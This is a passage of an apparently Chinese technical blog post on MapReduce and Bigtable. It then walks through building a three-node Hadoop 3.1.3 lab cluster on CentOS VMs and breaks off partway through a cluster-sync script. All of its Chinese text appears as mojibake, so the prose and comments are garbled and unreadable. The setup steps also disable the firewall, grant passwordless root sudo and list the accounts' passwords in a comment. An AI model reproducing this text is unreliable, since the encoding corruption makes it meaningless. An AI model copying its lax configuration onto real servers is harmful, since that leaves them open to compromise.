<li>ä¹‹åï¼ŒReducer ä¼šä¸ºæ¯ä¸ªé”®æ”¶é›†ä¸å…¶å…³è”çš„å€¼çš„é›†åˆï¼Œå¹¶è°ƒç”¨ç”¨æˆ·å®šä¹‰çš„ Reduce å‡½æ•°ã€‚Reduce å‡½æ•°çš„ç»“æœä¼šè¢«æ”¾å…¥åˆ°å¯¹åº”çš„ Reduce Partition ç»“æœæ–‡ä»¶</li>
</ol>
<p>å®é™…ä¸Šï¼Œåœ¨ä¸€ä¸ª MapReduce é›†ç¾¤ä¸­ï¼ŒMaster ä¼šè®°å½•æ¯ä¸€ä¸ª Map å’Œ Reduce ä»»åŠ¡çš„å½“å‰å®ŒæˆçŠ¶æ€ï¼Œä»¥åŠæ‰€åˆ†é…çš„ Workerã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒMaster è¿˜è´Ÿè´£å°† Mapper äº§ç”Ÿçš„ä¸­é—´ç»“æœæ–‡ä»¶çš„ä½ç½®å’Œå¤§å°è½¬å‘ç»™ Reducerã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ¯æ¬¡ MapReduce ä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œ $M$å’Œ$R$  çš„å€¼éƒ½åº”æ¯”é›†ç¾¤ä¸­çš„ Worker æ•°é‡è¦é«˜å¾—å¤šï¼Œä»¥è¾¾æˆé›†ç¾¤å†…è´Ÿè½½å‡è¡¡çš„æ•ˆæœã€‚</p>
<h3 id="Bigtable"><a href="#Bigtable" class="headerlink" title="Bigtable"></a>Bigtable</h3><h4 id="Bigtableæ˜¯ä»€ä¹ˆ"><a href="#Bigtableæ˜¯ä»€ä¹ˆ" class="headerlink" title="Bigtableæ˜¯ä»€ä¹ˆ"></a>Bigtableæ˜¯ä»€ä¹ˆ</h4><p>Bigtableæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„æ•°æ®å­˜å‚¨ç³»ç»Ÿï¼Œç”¨æ¥ç®¡ç†é‚£äº›è¢«è®¾è®¡ä¸ºå¯ä»¥æ¨ªè·¨ä¸Šä¸‡å°æœºå™¨ï¼Œè¾¾æµ·é‡çº§åˆ«çš„ç»“æ„åŒ–æ•°æ®ã€‚</p>
<p>ä¸€ä¸ªBigtableæ˜¯ä¸€ä¸ªç¨€ç–çš„ï¼Œåˆ†å¸ƒå¼çš„ï¼ŒæŒä¹…åŒ–çš„ï¼Œå¤šç»´åº¦çš„æœ‰åºMapã€‚<br>è¿™ä¸ªMapé€šè¿‡è¡Œé”®ï¼ˆrow keyï¼‰ï¼Œåˆ—é”®ï¼ˆcolumn keyï¼‰å’Œæ—¶é—´æˆ³æ¥è¿›è¡Œç´¢å¼•ï¼š<br>(row:string, column:string, time:int64) â†’ string</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046865.png" alt="Googleè®ºæ–‡ä¹‹Bigtableè¯¦è§£-å›¾1"></p>
<p>ä¸Šé¢æ˜¯ä¸€ä¸ªç”¨äºå­˜å‚¨æµ·é‡ç½‘é¡µçš„å¤§è¡¨çš„ç»“æ„ï¼Œ<br>ä»¥åè½¬çš„URLä½œä¸ºrowè¡Œåï¼Œä»¥ç½‘é¡µå†…å®¹contentsä½œä¸ºcolumnåˆ—åï¼Œå°†ç½‘é¡µä¸­çš„é”šç‚¹ä¿å­˜åœ¨anchoråˆ—ç°‡ä¸­ã€‚<br>contentsåˆ—æœ‰3ä¸ªç‰ˆæœ¬ï¼Œåˆ†åˆ«æ˜¯t3,t5,t6ï¼Œé€šè¿‡timestampå­—æ®µæ¥åŒºåˆ†ç‰ˆæœ¬ã€‚</p>
<p>Bigtableä¸æ”¯æŒå®Œæ•´çš„å…³ç³»æ•°æ®æ¨¡å‹ï¼Œç›¸åï¼Œå®ƒæä¾›ç»™å®¢æˆ·ç«¯ä¸€ç§éå¸¸ç®€å•çš„æ•°æ®æ¨¡å‹ï¼Œ<br>èƒ½å¤Ÿæ”¯æŒåŠ¨æ€çš„æ§åˆ¶æ•°æ®å¸ƒå±€å’Œæ•°æ®æ ¼å¼ï¼ˆdata layout and formatï¼‰ï¼Œå¹¶ä¸”å…è®¸å®¢æˆ·ç«¯æ¨å¯¼å‡ºæ•°æ®å­˜å‚¨åœ¨åº•å±‚å…·ä½“ä½ç½®ã€‚</p>
<p>å…·ä½“çš„æ•°æ®æ˜¯é€šè¿‡è¡Œåï¼ˆrow nameï¼‰å’Œåˆ—åï¼ˆcolumn nameï¼‰æ¥è¿›è¡Œç´¢å¼•çš„ï¼Œè¡Œåå’Œåˆ—åå¯ä»¥æ˜¯ä»»æ„çš„å­—ç¬¦ä¸²ã€‚</p>
<p>å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡ä»”ç»†è®¾è®¡çš„schemasæ¥æ§åˆ¶æ•°æ®çš„æ‰€åœ¨ä½ç½®ï¼Œä»¥è¾¾åˆ°æ˜¯ä»å†…å­˜è¿˜æ˜¯ç£ç›˜è·å–æ•°æ®ã€‚<br>å¹¶ä¸”å¤§è¡¨Bigtableé’ˆå¯¹æ¯è¡Œï¼ˆrowï¼‰çš„è¯»å†™éƒ½æ˜¯åŸå­æ€§çš„ã€‚</p>
<p>ä¸ºäº†å‡è½»ç®¡ç†è®¸å¤šä¸åŒç‰ˆæœ¬æ•°æ®çš„è´Ÿæ‹…ï¼Œå®¢æˆ·ç«¯è‡ªå®šä¹‰è®¾ç½®ä¿å­˜æœ€ånä¸ªæˆ–è€…nå¤©å†…çš„æ•°æ®ç‰ˆæœ¬ã€‚</p>
<h4 id="Bigtableæ ¸å¿ƒæ¦‚å¿µ"><a href="#Bigtableæ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="Bigtableæ ¸å¿ƒæ¦‚å¿µ"></a>Bigtableæ ¸å¿ƒæ¦‚å¿µ</h4><p><strong>column key åˆ—é”®</strong></p>
<p>åˆ—é”®ä½¿ç”¨ä»¥ä¸‹è¯­æ³•ï¼šåˆ—ç°‡å:ä¿®é¥°ç¬¦ã€‚æ¯”å¦‚ä¸Šé¢çš„anchor:cnnsi.comå°±æ˜¯ä¸€ä¸ªåˆ—é”®ï¼Œåˆ—ç°‡åæ˜¯anchor:ï¼Œä¿®é¥°ç¬¦æ˜¯cnnsi.comã€‚</p>
<p><strong>column family åˆ—ç°‡</strong></p>
<p>åˆ—é”®ç»„æˆåœ¨ä¸€èµ·çš„é›†åˆç§°ä½œåˆ—ç°‡ï¼Œæ˜¯æœ€åŸºæœ¬çš„è®¿é—®æ§åˆ¶å•å…ƒã€‚<br>æ˜¯å°†ç›¸ä¼¼çš„ä¸€ç±»ä¿¡æ¯æ”¾åœ¨ä¸€èµ·ï¼Œä½†æ˜¯å´åˆ†æˆå¤šä¸ªåˆ—æ¥å­˜å‚¨ï¼Œè¿™æ ·æ˜¯ä¸ºäº†é«˜æ•ˆçš„è¯»å–æ•°æ®ã€‚</p>
<p>åˆ—ç°‡å¿…é¡»å…ˆåˆ›å»ºï¼Œæ‰èƒ½åœ¨åˆ—ç°‡ä¸‹é¢çš„åˆ—ä¸­è¿›è¡Œæ•°æ®å­˜å–ã€‚ åœ¨æ‰¾åˆ—ç°‡ä¹‹å‰ä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®šrow keysè¿›è¡Œå¯»å€ï¼Œè¿™æ ·å¯ä»¥æ›´å¿«çš„å®šä½åˆ°æ•°æ®ï¼Œå…·æœ‰æ›´ä½³çš„æ€§èƒ½ã€‚</p>
<p>è™½ç„¶ä¸€å¼ å¤§è¡¨æ”¯æŒçš„å”¯ä¸€ååˆ—ç°‡çš„æ•°é‡è¾ƒå°‘ï¼ˆæœ€å¤šåªæœ‰æ•°ç™¾ï¼‰ï¼Œè€Œä¸”åˆ—ç°‡åœ¨æ“ä½œæœŸé—´å°½é‡å°‘æ”¹å˜ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ— é™æ‹“å±•å¤§è¡¨ä¸­çš„åˆ—æ•°é‡ã€‚</p>
<p>è®¿é—®æ§åˆ¶å’Œç£ç›˜æˆ–å†…å­˜çš„æ ¸ç®—éƒ½åœ¨åˆ—ç°‡çº§åˆ«è¿›è¡Œã€‚</p>
<p>å®¢æˆ·ç«¯å¯ä»¥å°†å¤šä¸ªåˆ—ç°‡ç»„åˆåœ¨ä¸€èµ·ï¼Œæˆä¸ºä¸€ä¸ªå­˜å‚¨ä½ç½®åˆ†ç»„ï¼ˆlocality groupï¼‰ã€‚<br>é’ˆå¯¹æ¯ä¸ªtabletçš„å­˜å‚¨ä½ç½®åˆ†ç»„ä¼šç”Ÿæˆä¸€ä¸ªå•ç‹¬çš„SSTableã€‚</p>
<p>ä¹‹æ‰€ä»¥åˆ†å¼€åˆ—ç°‡ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢å¯»æ‰¾æ•°æ®æ—¶è¢«ä¸€èµ·è®¿é—®ï¼Œä»è€Œæ›´æœ‰æ•ˆçš„è¿›è¡Œæ•°æ®è¯»å–ã€‚</p>
<p><strong>tablet è¡¨å—</strong></p>
<p>å’Œä¼ ç»Ÿå…³ç³»æ•°æ®åº“ä¸€æ ·ï¼Œä¸€ä¸ªè¡¨æœ‰å¾ˆå¤šè¡Œï¼ˆrowï¼‰ï¼Œç”±å¾ˆå¤šè¡Œç»„æˆçš„è¡ŒèŒƒå›´ï¼ˆrow rangeï¼‰å°±æ˜¯ä¸€ä¸ªtabletï¼ˆè¿™é‡Œç¿»è¯‘ä¸ºè¡¨å—ï¼‰ï¼Œ<br>æ¯”å¦‚ç¬¬1000~1500è¡Œï¼Œå°±æ˜¯ä¸€ä¸ªtabletã€‚è¡¨å—æ˜¯è¢«åŠ¨æ€åˆ’åˆ†çš„ï¼ˆä½†ç›¸é‚»çš„åº”è¯¥åœ¨ä¸€èµ·ï¼‰ï¼Œå®ƒæ˜¯åˆ†å‘å’Œè´Ÿè½½å‡è¡¡å¾—åŸºæœ¬å•ä½ã€‚</p>
<h4 id="Bigtableå…·ä½“å®ç°"><a href="#Bigtableå…·ä½“å®ç°" class="headerlink" title="Bigtableå…·ä½“å®ç°"></a>Bigtableå…·ä½“å®ç°</h4><p>Bigtableä¸»è¦ç”±3ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p>
<ul>
<li>æ¯ä¸ªå®¢æˆ·ç«¯ä½¿ç”¨çš„lib</li>
<li>masteræœåŠ¡å™¨</li>
<li>å¤šä¸ªtabletæœåŠ¡å™¨</li>
</ul>
<p>masterè´Ÿè´£åˆ†é…tabletsç»™tabletæœåŠ¡å™¨ï¼Œå¹¶ç›‘æ§ï¼Œæ¢æµ‹tabletæœåŠ¡å™¨çš„å¢åŠ å’Œå¤±æ•ˆï¼Œè´Ÿè´£tabletçš„å¤æ‚å‡è¡¡ï¼Œå¯¹GFSä¸Šçš„æ–‡ä»¶è¿›è¡Œåƒåœ¾å›æ”¶ã€‚</p>
<p>masterè¿˜å¤„ç†è¡¨æˆ–è€…åˆ—ç°‡çš„åˆ›å»ºå¯¼è‡´çš„schemaçš„æ”¹å˜ã€‚</p>
<p>tabletæœåŠ¡å™¨ç®¡ç†ä¸€ç³»åˆ—çš„tabletsï¼Œå¹¶è´Ÿè´£å¤„ç†å®ƒä»¬çš„è¯»å†™è¯·æ±‚ï¼Œä»¥åŠå½“tabletså¤ªå¤§æ—¶çš„åˆ‡å‰²æ“ä½œã€‚</p>
<p>ä¸€ä¸ªBigtableé›†ç¾¤æœ‰è®¸å¤šçš„å¤§è¡¨ï¼Œæ¯ä¸ªå¤§è¡¨åŒ…æœ‰ä¸€ç³»åˆ—çš„tabletsç»„æˆï¼Œæ¯ä¸ªtablesç”±ä¸€å®šèŒƒå›´çš„rowsç»„æˆã€‚</p>
<h2 id="äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ"><a href="#äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ" class="headerlink" title="äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ"></a>äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ</h2><h3 id="å‡†å¤‡ä¸€ä¸ªæ¨¡ç‰ˆè™šæ‹Ÿæœº"><a href="#å‡†å¤‡ä¸€ä¸ªæ¨¡ç‰ˆè™šæ‹Ÿæœº" class="headerlink" title="å‡†å¤‡ä¸€ä¸ªæ¨¡ç‰ˆè™šæ‹Ÿæœº"></a>å‡†å¤‡ä¸€ä¸ªæ¨¡ç‰ˆè™šæ‹Ÿæœº</h3><p>ç”¨Parallels Desktopå®‰è£…centos 7.5ï¼Œè®¾ç½®é™æ€ ip10.211.55.3ï¼Œä¸»æœºåä¸ºhadoop100</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹ä¸»æœºå</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop100</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å…³é—­é˜²ç«å¢™</span></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ›å»ºhuangç”¨æˆ·</span></span><br><span class="line">[hmw@hadoop100 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop100 ~]$ passwd huang</span><br><span class="line"><span class="meta">#</span><span class="language-bash">rootå’Œhmwå¯†ç hmwï¼Œhuangå¯†ç yc</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®hmwç”¨æˆ·å…·æœ‰rootæƒé™</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨%wheel  ALL=(ALL) ALLè¿™è¡Œä¸‹é¢æ·»åŠ ä¸€è¡Œ</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¿™ä¸€è¡Œä¸è¦ç›´æ¥æ”¾åˆ° root è¡Œä¸‹é¢ï¼Œå› ä¸ºæ‰€æœ‰ç”¨æˆ·éƒ½å±äº wheel ç»„ï¼Œä½ å…ˆé…ç½®äº†huangå…·æœ‰å…å¯†åŠŸèƒ½ï¼Œä½†æ˜¯ç¨‹åºæ‰§è¡Œåˆ°%wheelè¡Œæ—¶ï¼Œè¯¥åŠŸèƒ½åˆè¢«è¦†ç›–å›éœ€è¦å¯†ç ã€‚æ‰€ä»¥huangè¦æ”¾åˆ°%wheelè¿™è¡Œä¸‹é¢ã€‚</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹è¿™ä¸¤ä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€æœ‰å±ç»„</span></span><br><span class="line">[hmw@hadoop100 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop100 ~]$ ll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¸è½½è™šæ‹Ÿæœºè‡ªå¸¦çš„JDK</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm-qa:æŸ¥è¯¢æ‰€å®‰è£…çš„æ‰€æœ‰rpmè½¯ä»¶åŒ…</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">grep -i:å¿½ç•¥å¤§å°å†™</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">xargs -n1:è¡¨ç¤ºæ¯æ¬¡åªä¼ é€’ä¸€ä¸ªå‚æ•°</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm -e â€“nodeps:å¼ºåˆ¶å¸è½½è½¯ä»¶</span></span><br><span class="line">[hmw@hadoop100 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">[hmw@hadoop100 ~]$ reboot</span><br></pre></td></tr></table></figure>

<h3 id="å…‹éš†è™šæ‹Ÿæœº"><a href="#å…‹éš†è™šæ‹Ÿæœº" class="headerlink" title="å…‹éš†è™šæ‹Ÿæœº"></a>å…‹éš†è™šæ‹Ÿæœº</h3><p>åˆ©ç”¨æ¨¡ç‰ˆè™šæ‹Ÿæœºå…‹éš†ä¸‰å°è™šæ‹Ÿæœº hadoop102(10.211.55.4) hadoop103(10.211.55.5) hadoop104(10.211.55.6)ï¼Œå…‹éš†çš„æ—¶å€™å…ˆå…³é—­è™šæ‹Ÿæœº</p>
<h4 id="ä¿®æ”¹å…‹éš†æœºçš„ä¸»æœºåå’Œhostsï¼Œå·²hadoop102ä¸ºä¾‹"><a href="#ä¿®æ”¹å…‹éš†æœºçš„ä¸»æœºåå’Œhostsï¼Œå·²hadoop102ä¸ºä¾‹" class="headerlink" title="ä¿®æ”¹å…‹éš†æœºçš„ä¸»æœºåå’Œhostsï¼Œå·²hadoop102ä¸ºä¾‹"></a>ä¿®æ”¹å…‹éš†æœºçš„ä¸»æœºåå’Œhostsï¼Œå·²hadoop102ä¸ºä¾‹</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹hostname</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹hosts</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hosts</span><br><span class="line">10.211.55.3 hadoop100</span><br><span class="line">10.211.55.4 hadoop102</span><br><span class="line">10.211.55.5 hadoop103</span><br><span class="line">10.211.55.6 hadoop104</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">[huang@hadoop100 ~]$ reboot</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–è™šæ‹Ÿæœºä»¥ç›¸åŒæ–¹å¼å»ä¿®æ”¹</p>
<h4 id="ä¿®æ”¹ä¸»æœºMacçš„hosts"><a href="#ä¿®æ”¹ä¸»æœºMacçš„hosts" class="headerlink" title="ä¿®æ”¹ä¸»æœºMacçš„hosts"></a>ä¿®æ”¹ä¸»æœºMacçš„hosts</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % vi /etc/hosts</span><br><span class="line">10.211.55.3 hadoop100</span><br><span class="line">10.211.55.4 hadoop102</span><br><span class="line">10.211.55.5 hadoop103</span><br><span class="line">10.211.55.6 hadoop104</span><br></pre></td></tr></table></figure>

<h3 id="åœ¨hadoop102å®‰è£…JDK"><a href="#åœ¨hadoop102å®‰è£…JDK" class="headerlink" title="åœ¨hadoop102å®‰è£…JDK"></a>åœ¨hadoop102å®‰è£…JDK</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å°†macä¸­ä¸‹è½½å¥½çš„jdkå¯¼å…¥åˆ°hadoop102è™šæ‹Ÿæœºçš„/opt/softwareç›®å½•ä¸‹</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹æ˜¯å¦å¯¼å…¥æˆåŠŸ</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">æ€»ç”¨é‡ 190444</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 6æœˆ  28 00:09 jdk-8u212-linux-x64.tar.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è§£å‹</span></span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®JDKç¯å¢ƒå˜é‡</span></span><br><span class="line">[huang@hadoop102 ~]$  sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®©æ–°çš„ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ</span></span><br><span class="line">[huang@hadoop102 ~]$ source /etc/profile</span><br><span class="line">[huang@hadoop102 ~]$ java -version</span><br><span class="line">java version &quot;1.8.0_212&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_212-b10)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.212-b10, mixed mode)</span><br></pre></td></tr></table></figure>

<h3 id="åœ¨hadoop102å®‰è£…Hadoop"><a href="#åœ¨hadoop102å®‰è£…Hadoop" class="headerlink" title="åœ¨hadoop102å®‰è£…Hadoop"></a>åœ¨hadoop102å®‰è£…Hadoop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å°†macä¸­ä¸‹è½½å¥½çš„hadoopå¯¼å…¥åˆ°hadoop102è™šæ‹Ÿæœºçš„/opt/softwareç›®å½•ä¸‹</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/hadoop-3.1.3.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">è§£å‹</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf hadoop-3.1.3.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line">[huang@hadoop102 software]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ pwd</span><br><span class="line">/opt/module/hadoop-3.1.3</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sudo vi /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®©é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ source /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop version</span><br><span class="line">Hadoop 3.1.3</span><br><span class="line">Source code repository https://gitbox.apache.org/repos/asf/hadoop.git -r ba631c436b806728f8ec2f54ab1e289526c90579</span><br><span class="line">Compiled by ztang on 2019-09-12T02:47Z</span><br><span class="line">Compiled with protoc 2.5.0</span><br><span class="line">From source with checksum ec785077c385118ac91aadde5ec9799</span><br><span class="line">This command was run using /opt/module/hadoop-3.1.3/share/hadoop/common/hadoop-common-3.1.3.jar</span><br></pre></td></tr></table></figure>

<h3 id="Hadoopç›®å½•ç»“æ„"><a href="#Hadoopç›®å½•ç»“æ„" class="headerlink" title="Hadoopç›®å½•ç»“æ„"></a>Hadoopç›®å½•ç»“æ„</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">æ€»ç”¨é‡ 200</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 bin</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9æœˆ   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9æœˆ   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9æœˆ   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 share</span><br></pre></td></tr></table></figure>

<ul>
<li>bin ç›®å½•:å­˜æ”¾å¯¹ Hadoop ç›¸å…³æœåŠ¡(hdfsï¼Œyarnï¼Œmapred)è¿›è¡Œæ“ä½œçš„è„šæœ¬ </li>
<li>etc ç›®å½•:Hadoop çš„é…ç½®æ–‡ä»¶ç›®å½•ï¼Œå­˜æ”¾ Hadoop çš„é…ç½®æ–‡ä»¶</li>
<li>lib ç›®å½•:å­˜æ”¾ Hadoop çš„æœ¬åœ°åº“(å¯¹æ•°æ®è¿›è¡Œå‹ç¼©è§£å‹ç¼©åŠŸèƒ½)</li>
<li>sbin ç›®å½•:å­˜æ”¾å¯åŠ¨æˆ–åœæ­¢ Hadoop ç›¸å…³æœåŠ¡çš„è„šæœ¬</li>
<li>share ç›®å½•:å­˜æ”¾ Hadoop çš„ä¾èµ– jar åŒ…ã€æ–‡æ¡£ã€å’Œå®˜æ–¹æ¡ˆä¾‹</li>
</ul>
<h3 id="ç¼–å†™é›†ç¾¤åˆ†å‘è„šæœ¬"><a href="#ç¼–å†™é›†ç¾¤åˆ†å‘è„šæœ¬" class="headerlink" title="ç¼–å†™é›†ç¾¤åˆ†å‘è„šæœ¬"></a>ç¼–å†™é›†ç¾¤åˆ†å‘è„šæœ¬</h3><h4 id="rsyncå’Œscpçš„åŒºåˆ«"><a href="#rsyncå’Œscpçš„åŒºåˆ«" class="headerlink" title="rsyncå’Œscpçš„åŒºåˆ«"></a>rsyncå’Œscpçš„åŒºåˆ«</h4><p>rsync ä¸»è¦ç”¨äºå¤‡ä»½å’Œé•œåƒã€‚å…·æœ‰é€Ÿåº¦å¿«ã€é¿å…å¤åˆ¶ç›¸åŒå†…å®¹å’Œæ”¯æŒç¬¦å·é“¾æ¥çš„ä¼˜ç‚¹ã€‚</p>
<p>rsync å’Œ scp åŒºåˆ«:ç”¨ rsync åšæ–‡ä»¶çš„å¤åˆ¶è¦æ¯” scp çš„é€Ÿåº¦å¿«ï¼Œrsync åªå¯¹å·®å¼‚æ–‡ä»¶åšæ›´</p>
<p>æ–°ã€‚scp æ˜¯æŠŠæ‰€æœ‰æ–‡ä»¶éƒ½å¤åˆ¶è¿‡å»ã€‚</p>
<h4 id="ç¼–å†™xsyncé›†ç¾¤åˆ†å‘è„šæœ¬"><a href="#ç¼–å†™xsyncé›†ç¾¤åˆ†å‘è„šæœ¬" class="headerlink" title="ç¼–å†™xsyncé›†ç¾¤åˆ†å‘è„šæœ¬"></a>ç¼–å†™xsyncé›†ç¾¤åˆ†å‘è„šæœ¬</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ ä¸€ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">1. åˆ¤æ–­å‚æ•°ä¸ªæ•°</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="language-bash">2. éå†é›†ç¾¤æ‰€æœ‰æœºå™¨</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta">	#</span><span class="language-bash">3. éå†æ‰€æœ‰ç›®å½•ï¼ŒæŒ¨ä¸ªå‘é€</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta">		#</span><span class="language-bash">4. åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. è·å–çˆ¶ç›®å½•</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. è·å–å½“å‰æ–‡ä»¶çš„åç§° </span><br><span class="line">				